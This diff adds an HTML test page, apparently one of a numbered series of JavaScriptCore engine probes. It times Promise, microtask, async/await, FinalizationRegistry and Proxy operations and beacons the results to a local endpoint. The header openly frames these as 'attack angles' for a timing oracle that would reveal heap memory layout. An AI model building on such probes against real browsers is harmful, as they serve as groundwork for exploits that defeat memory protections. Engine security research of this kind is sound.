@@ -1,0 +1,372 @@
+<!--
+  p718: Promise/Microtask queue internal timing oracle
+
+  Promise resolution and microtask scheduling in JSC use internal
+  queues whose ordering and timing depend on memory layout. The
+  microtask queue is a C++ deque; Promise reaction records are
+  C++ objects allocated from the general heap.
+
+  Key insight: Promise.all/race/allSettled/any create internal
+  PromiseReaction chains. The resolution timing of N promises
+  reveals the queue traversal cost, which depends on how the
+  reaction objects are laid out in memory.
+
+  Attack angles:
+  A) Promise.all resolution timing -- resolve N promises in
+     different orders. Queue traversal depends on reaction layout.
+  B) Microtask queue depth timing -- nested queueMicrotask calls
+     to build deep microtask chains. Timing reveals queue growth.
+  C) Promise.race cancellation timing -- first-to-resolve among
+     N promises. Internal cleanup of remaining reactions varies
+     with allocation pattern.
+  D) async/await continuation timing -- async function suspension
+     and resumption. The continuation is a microtask whose
+     scheduling cost depends on coroutine frame layout.
+  E) FinalizationRegistry callback timing -- weak ref cleanup
+     happens during GC. The callback ordering may be
+     address-dependent.
+  F) Proxy trap microtask interaction -- Proxy with async trap
+     handlers. The trap invocation creates microtask-visible
+     internal states.
+
+  CRASH_CLASS: LOW (Promise/microtask API, no mutation)
+  prior art: p717 (Event timing), p604 (DFG NaN confusion)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p718</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+async function main(){
+  b('P718-START:PROMISE-MICROTASK-LEAK');
+  var results = [];
+
+  // === SECTION A: Promise.all resolution timing ===
+  b('A:PROMISE-ALL-TIMING');
+  try {
+    var counts = [10, 50, 100, 500, 1000];
+    var allTimes = [];
+
+    for (var c = 0; c < counts.length; c++) {
+      var n = counts[c];
+      var resolvers = [];
+      var promises = [];
+
+      for (var i = 0; i < n; i++) {
+        (function() {
+          var resolve;
+          promises.push(new Promise(function(r) { resolve = r; }));
+          resolvers.push(resolve);
+        })();
+      }
+
+      // Resolve all at once and measure
+      var t0 = performance.now();
+      for (var i = 0; i < n; i++) resolvers[i](i);
+      await Promise.all(promises);
+      var dt = performance.now() - t0;
+      allTimes.push(n + ':' + dt.toFixed(3));
+    }
+    b('A:ALL-TIMES:' + allTimes.join(','));
+
+    // Check scaling
+    var times = allTimes.map(function(t){return parseFloat(t.split(':')[1]);});
+    if (times.length >= 2) {
+      var ratio = times[times.length-1] / times[0];
+      b('A:SCALING=' + ratio.toFixed(2));
+    }
+
+    // Reverse order resolution
+    var revTimes = [];
+    for (var c = 0; c < counts.length; c++) {
+      var n = counts[c];
+      var resolvers = [];
+      var promises = [];
+
+      for (var i = 0; i < n; i++) {
+        (function() {
+          var resolve;
+          promises.push(new Promise(function(r) { resolve = r; }));
+          resolvers.push(resolve);
+        })();
+      }
+
+      var t0 = performance.now();
+      for (var i = n - 1; i >= 0; i--) resolvers[i](i);
+      await Promise.all(promises);
+      var dt = performance.now() - t0;
+      revTimes.push(n + ':' + dt.toFixed(3));
+    }
+    b('A:REV-TIMES:' + revTimes.join(','));
+
+    // Compare forward vs reverse
+    for (var i = 0; i < Math.min(allTimes.length, revTimes.length); i++) {
+      var fwd = parseFloat(allTimes[i].split(':')[1]);
+      var rev = parseFloat(revTimes[i].split(':')[1]);
+      if (Math.abs(fwd - rev) / Math.max(fwd, rev) > 0.2) {
+        results.push('A:order-dependent-' + counts[i]);
+      }
+    }
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: Microtask queue depth timing ===
+  b('B:MICROTASK-DEPTH');
+  try {
+    var depthTimes = [];
+    var depths = [10, 50, 100, 500, 1000, 5000];
+
+    for (var d = 0; d < depths.length; d++) {
+      var depth = depths[d];
+      var counter = 0;
+
+      var p = new Promise(function(resolve) {
+        function chain(remaining) {
+          counter++;
+          if (remaining > 0) {
+            queueMicrotask(function() { chain(remaining - 1); });
+          } else {
+            resolve();
+          }
+        }
+
+        var t0 = performance.now();
+        chain(depth);
+        // t0 is before the chain starts resolving
+        resolve.__t0 = t0;
+      });
+
+      var t0 = performance.now();
+      await p;
+      var dt = performance.now() - t0;
+      depthTimes.push(depth + ':' + dt.toFixed(3) + ':n=' + counter);
+    }
+    b('B:DEPTH-TIMES:' + depthTimes.join(','));
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: Promise.race cancellation timing ===
+  b('C:PROMISE-RACE');
+  try {
+    var raceCounts = [10, 50, 100, 500];
+    var raceTimes = [];
+
+    for (var rc = 0; rc < raceCounts.length; rc++) {
+      var n = raceCounts[rc];
+      var resolvers = [];
+      var promises = [];
+
+      for (var i = 0; i < n; i++) {
+        (function() {
+          var resolve;
+          promises.push(new Promise(function(r) { resolve = r; }));
+          resolvers.push(resolve);
+        })();
+      }
+
+      // Resolve FIRST one, measure race completion
+      var t0 = performance.now();
+      resolvers[0]('winner');
+      var result = await Promise.race(promises);
+      var dt = performance.now() - t0;
+      raceTimes.push(n + ':' + dt.toFixed(3));
+    }
+    b('C:RACE-TIMES:' + raceTimes.join(','));
+
+    // Resolve LAST one instead
+    var raceLastTimes = [];
+    for (var rc = 0; rc < raceCounts.length; rc++) {
+      var n = raceCounts[rc];
+      var resolvers = [];
+      var promises = [];
+
+      for (var i = 0; i < n; i++) {
+        (function() {
+          var resolve;
+          promises.push(new Promise(function(r) { resolve = r; }));
+          resolvers.push(resolve);
+        })();
+      }
+
+      var t0 = performance.now();
+      resolvers[n - 1]('winner');
+      var result = await Promise.race(promises);
+      var dt = performance.now() - t0;
+      raceLastTimes.push(n + ':' + dt.toFixed(3));
+    }
+    b('C:RACE-LAST-TIMES:' + raceLastTimes.join(','));
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: async/await continuation timing ===
+  b('D:ASYNC-AWAIT-TIMING');
+  try {
+    async function chainedAwait(depth) {
+      if (depth <= 0) return depth;
+      return await chainedAwait(depth - 1);
+    }
+
+    var awaitDepths = [1, 5, 10, 25, 50, 100];
+    var awaitTimes = [];
+
+    for (var d = 0; d < awaitDepths.length; d++) {
+      var t0 = performance.now();
+      for (var iter = 0; iter < 100; iter++) {
+        await chainedAwait(awaitDepths[d]);
+      }
+      var dt = performance.now() - t0;
+      awaitTimes.push(awaitDepths[d] + ':' + dt.toFixed(2));
+    }
+    b('D:AWAIT-TIMES:' + awaitTimes.join(','));
+
+    // Parallel await timing
+    async function parallelWork(n) {
+      var promises = [];
+      for (var i = 0; i < n; i++) {
+        promises.push(Promise.resolve(i).then(function(v) { return v * 2; }));
+      }
+      return Promise.all(promises);
+    }
+
+    var parallelCounts = [10, 50, 100, 500];
+    var parallelTimes = [];
+    for (var pc = 0; pc < parallelCounts.length; pc++) {
+      var t0 = performance.now();
+      await parallelWork(parallelCounts[pc]);
+      var dt = performance.now() - t0;
+      parallelTimes.push(parallelCounts[pc] + ':' + dt.toFixed(3));
+    }
+    b('D:PARALLEL-TIMES:' + parallelTimes.join(','));
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: FinalizationRegistry callback ordering ===
+  b('E:FINALIZATION-REGISTRY');
+  try {
+    if (typeof FinalizationRegistry !== 'undefined') {
+      b('E:FR-AVAILABLE');
+
+      var cleanupOrder = [];
+      var fr = new FinalizationRegistry(function(held) {
+        cleanupOrder.push(held);
+      });
+
+      // Register objects in known order
+      for (var i = 0; i < 20; i++) {
+        var obj = {id: i};
+        fr.register(obj, i);
+        obj = null; // allow GC
+      }
+
+      // Force GC pressure
+      var garbage = [];
+      for (var i = 0; i < 100000; i++) {
+        garbage.push({x: i, y: new Array(10)});
+      }
+      garbage = null;
+
+      // Wait for potential cleanup callbacks
+      await new Promise(function(resolve) { setTimeout(resolve, 500); });
+
+      if (cleanupOrder.length > 0) {
+        b('E:CLEANUP-ORDER:' + cleanupOrder.join(','));
+        b('E:CLEANUP-COUNT=' + cleanupOrder.length);
+
+        // Check if order matches registration order
+        var inOrder = true;
+        for (var i = 1; i < cleanupOrder.length; i++) {
+          if (cleanupOrder[i] < cleanupOrder[i-1]) { inOrder = false; break; }
+        }
+        b('E:IN-ORDER=' + inOrder);
+        if (!inOrder) results.push('E:non-sequential-cleanup');
+      } else {
+        b('E:NO-CLEANUP-YET');
+      }
+    } else {
+      b('E:FR-NOT-AVAILABLE');
+    }
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === SECTION F: Proxy trap timing ===
+  b('F:PROXY-TRAP-TIMING');
+  try {
+    var trapCounts = {get: 0, set: 0, has: 0, ownKeys: 0};
+
+    var proxy = new Proxy({a: 1, b: 2, c: 3, d: 4, e: 5}, {
+      get: function(target, prop) {
+        trapCounts.get++;
+        return target[prop];
+      },
+      set: function(target, prop, val) {
+        trapCounts.set++;
+        target[prop] = val;
+        return true;
+      },
+      has: function(target, prop) {
+        trapCounts.has++;
+        return prop in target;
+      },
+      ownKeys: function(target) {
+        trapCounts.ownKeys++;
+        return Object.keys(target);
+      }
+    });
+
+    // Measure trap invocation timing
+    var getTimes = [];
+    for (var round = 0; round < 10; round++) {
+      var t0 = performance.now();
+      for (var i = 0; i < 50000; i++) {
+        var v = proxy.a;
+        v = proxy.b;
+        v = proxy.c;
+      }
+      getTimes.push((performance.now() - t0).toFixed(2));
+    }
+    b('F:GET-TIMES:' + getTimes.join(','));
+
+    var hasTimes = [];
+    for (var round = 0; round < 10; round++) {
+      var t0 = performance.now();
+      for (var i = 0; i < 50000; i++) {
+        var v = 'a' in proxy;
+        v = 'x' in proxy;
+        v = 'c' in proxy;
+      }
+      hasTimes.push((performance.now() - t0).toFixed(2));
+    }
+    b('F:HAS-TIMES:' + hasTimes.join(','));
+
+    var keysTimes = [];
+    for (var round = 0; round < 10; round++) {
+      var t0 = performance.now();
+      for (var i = 0; i < 10000; i++) {
+        Object.keys(proxy);
+      }
+      keysTimes.push((performance.now() - t0).toFixed(2));
+    }
+    b('F:KEYS-TIMES:' + keysTimes.join(','));
+
+    b('F:TRAP-COUNTS:get=' + trapCounts.get + ',set=' + trapCounts.set +
+      ',has=' + trapCounts.has + ',ownKeys=' + trapCounts.ownKeys);
+  } catch(e) {
+    b('F:ERR:' + e.message);
+  }
+
+  // === RESULTS ===
+  if (results.length > 0) {
+    b('P718-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P718-RESULT:NO-LEAK-DETECTED');
+  }
+  b('P718-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p718: Promise/Microtask queue internal timing oracle</pre></body></html>
